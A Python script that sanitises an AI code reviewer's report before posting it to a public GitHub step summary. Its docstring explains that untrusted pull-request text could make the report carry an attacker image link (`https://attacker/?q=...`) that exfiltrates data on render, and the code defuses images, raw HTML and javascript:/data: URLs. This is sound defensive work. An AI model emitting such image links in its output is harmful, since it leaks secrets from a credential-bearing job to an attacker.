"""Publish the reviewer's report to the step summary without render-time fetches.

The mention job holds a credential and its step summary is public. The pinned action's
own `display_report` input warns that it "outputs Claude-authored content in the GitHub
Step Summary" and "should only be used in cases where the action is used solely with
trusted input" -- and this job's input is a candidate Pull Request, which is untrusted by
definition.

The concrete hazard is not that the report might be wrong. It is that a step summary
renders Markdown, including images, so a report that echoes attacker-supplied text can
carry `![](https://attacker/?q=...)`, which the browser fetches when the page is
rendered, with no click. That is an exfiltration channel out of a credential-bearing
job, and it is the one channel none of the other controls in Decision 0094 touch: they
all govern what the reviewer *reads*, not what it *publishes*.

So the action's own rendering is disabled and the report is published here instead,
after every render-time fetch vector is neutralised:

* an image becomes literal text, inline or reference-style, so nothing is requested;
* raw HTML is escaped, since GitHub's Markdown allows `<img>` and friends;
* `javascript:` and `data:` URLs are defused;
* fenced code is left alone, because nothing inside a fence renders -- and a report
  about code is unreadable if its code is mangled.

Bounded, too: a report is truncated with a notice rather than pasted at any length.

Invoked from `.github/workflows/claude.yml`, which for the mention triggers runs from
the repository's default branch, so this file is not candidate-supplied.
"""

from __future__ import annotations

import json
import pathlib
import re
import sys
from typing import Any

_MAX_BYTES = 65536
_FENCE = re.compile(r"\A\s{0,3}(`{3,}|~{3,})")
# Escaping the bracket, not the bang: `!\[x](u)` renders as literal text,
# whereas escaping only the bang would leave a clickable link behind.
_IMAGE = re.compile(r"!\[")
_DANGEROUS_SCHEME = re.compile(r"(?i)\b(javascript|data|vbscript)\s*:")


def final_report(turns: list[Any]) -> str:
    """Return the reviewer's final text from the execution file's turns."""
    for turn in reversed(turns):
        if not isinstance(turn, dict):
            continue
        if turn.get("type") == "result" and isinstance(turn.get("result"), str):
            return turn["result"]
    # Fall back to the last assistant text block.
    for turn in reversed(turns):
        if not isinstance(turn, dict):
            continue
        message = turn.get("message")
        content = message.get("content") if isinstance(message, dict) else None
        if not isinstance(content, list):
            continue
        texts = [
            block["text"]
            for block in content
            if isinstance(block, dict) and isinstance(block.get("text"), str)
        ]
        if texts:
            return "\n".join(texts)
    return ""


def neutralise(text: str) -> str:
    """Return ``text`` with every render-time fetch vector defused.

    Fenced code is passed through: nothing inside a fence renders, and mangling it
    would make a report about code unreadable. A fence the report opens and never
    closes therefore protects nothing an attacker gains by -- the content simply stays
    unrendered.
    """
    out: list[str] = []
    fence: str | None = None
    for line in text.splitlines():
        marker = _FENCE.match(line)
        if fence is None and marker:
            fence = marker.group(1)[0] * 3
            out.append(line)
            continue
        if fence is not None:
            out.append(line)
            if marker and marker.group(1)[0] * 3 == fence:
                fence = None
            continue
        safe = line.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        safe = _IMAGE.sub(r"!\\[", safe)
        safe = _DANGEROUS_SCHEME.sub(r"\1&#58;", safe)
        out.append(safe)
    return "\n".join(out)


def render(execution_file: pathlib.Path) -> str:
    """Return the publishable report for ``execution_file``."""
    try:
        turns = json.loads(execution_file.read_text(encoding="utf-8"))
    except (OSError, ValueError) as error:
        return f"## Review report unavailable\n\nCould not read the execution output: {error}\n"
    if not isinstance(turns, list):
        return "## Review report unavailable\n\nThe execution output was not a list of turns.\n"
    report = final_report(turns)
    if not report.strip():
        return "## Review report unavailable\n\nThe reviewer produced no final text.\n"
    body = neutralise(report)
    encoded = body.encode("utf-8")
    if len(encoded) > _MAX_BYTES:
        body = encoded[:_MAX_BYTES].decode("utf-8", "ignore")
        body += f"\n\n[report truncated at {_MAX_BYTES} bytes]"
    return (
        "## Claude review report\n\n"
        "Published by the repository, not by the action: images and raw HTML are\n"
        "neutralised because a step summary is public and renders Markdown.\n\n"
        f"{body}\n"
    )


def main(argv: list[str]) -> int:
    if len(argv) != 3:
        print(f"usage: {argv[0]} <execution-file> <summary-file>", file=sys.stderr)
        return 2
    summary = pathlib.Path(argv[2])
    with summary.open("a", encoding="utf-8") as handle:
        handle.write(render(pathlib.Path(argv[1])))
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
